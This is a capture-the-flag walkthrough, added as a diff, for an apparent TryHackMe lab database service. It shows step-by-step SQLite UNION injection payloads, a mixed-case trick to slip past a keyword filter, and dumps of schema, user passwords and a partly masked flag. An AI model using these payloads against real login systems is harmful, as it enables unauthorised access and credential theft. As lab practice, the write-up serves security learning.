@@ -1,0 +1,81 @@
+step1:
+    Read the given instruction carefully.
+    ***Given Instruction: I am working on a database application called Light!
+    Would you like to try it out? If so, the application is running on port 1337.
+    You can connect to it using nc 10.10.47.226 1337
+    You can use the username smokey in order to get started.
+
+
+step2:
+    open terminal and type below the command.
+    istiyak@kali:~ nc 10.10.47.226 1337
+    Welcome to the Light database!
+    Please enter your username: smokey
+    Password: vYQ5ngPpw8AdUmL
+
+step3:
+    At first let's determine whether the database type is MySQL, PostgreSQL,
+    SQLite, Microsoft SQL Server, Oracle Database, or MariaDB.
+    istiyak@kali:~Please enter your username: ' unIOn SelECt @@version()'
+    Error: unrecognized token: "@"
+
+    istiyak@kali:~ Please enter your username: ' unIOn SelECt version()'
+    Error: no such function: version
+
+    istiyak@kali:~ Please enter your username: ' unIOn SelECt @@versIon'
+    Error: unrecognized token: "@"
+
+    istiyak@kali:~ Please enter your username: ' unIOn SelECt banner fRom v$versIon'
+    Error: no such table: v$versIon
+
+    istiyak@kali:~ Please enter your username: ' unIOn SelECt sqlite_version()'
+    Password: 3.31.1
+
+    ***Finally we found the database type and it is a SQLite Database***
+
+
+step4:
+    Since it is a SQLite database, let's attempt some SQL injection.
+    
+    istiyak@kali:~ Please enter your username: UNION SELECT * FROM users;
+    Ahh there is a word in there I don't like :(
+
+    istiyak@kali:~ Please enter your username: UNION SELECT username, password FROM users;
+    Ahh there is a word in there I don't like :(
+
+    istiyak@kali:~ Please enter your username: ' Union Select # '
+    Error: unrecognized token: "#"
+
+    istiyak@kali:~ Please enter your username: ' Union Select 1 -- -
+    For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
+
+    istiyak@kali:~ Please enter your username: ' UNION SELECT GROUP_CONCAT(SQL) FROM SQLITE_MASTER'
+    Ahh there is a word in there I don't like :(
+    istiyak@kali:~ Please enter your username: ' union select group_concat(sql) from sqlite_master'
+    Ahh there is a word in there I don't like :(
+    istiyak@kali:~ Please enter your username: ' UnIOn SeLeCT group_concat(sql) FrOm sqlite_master '
+    Password: CREATE TABLE usertable (
+                    id INTEGER PRIMARY KEY,
+                    username TEXT,
+                    password INTEGER),CREATE TABLE admintable (
+                    id INTEGER PRIMARY KEY,
+                    username TEXT,
+                    password INTEGER)
+    
+    istiyak@kali:~ Please enter your username: ' UnIOn SeLeCT group_concat(username) FrOm usertable '
+    Password: alice,rob,john,michael,smokey,hazel,ralph,steve
+
+    istiyak@kali:~ Please enter your username: ' UnIOn SeLeCT group_concat(password) From usertable '
+    Password: tF8tj2o94WE4LKC,yAn4fPaF2qpCKpR,e74tqwRh2oApPo6,7DV4dwA0g5FacRe,
+    vYQ5ngPpw8AdUmL,EcSuU35WlVipjXG,YO1U9O1m52aJImA,WObjufHX1foR8d7
+
+    istiyak@kali:~ Please enter your username: ' UnIOn SeLeCT group_concat(username) FrOm admintable '
+    Password: TryHackMe*****,flag
+
+    istiyak@kali:~ Please enter your username: ' UnIOn SeLeCT group_concat(password) From admintable '
+    Password: mamZtAuMlrsEy5bp6q17,THM{SQLit3_***********************}
+
+
+<!----------Author's message: Give it a try yourself. Happy hacking!----------->
+
+    
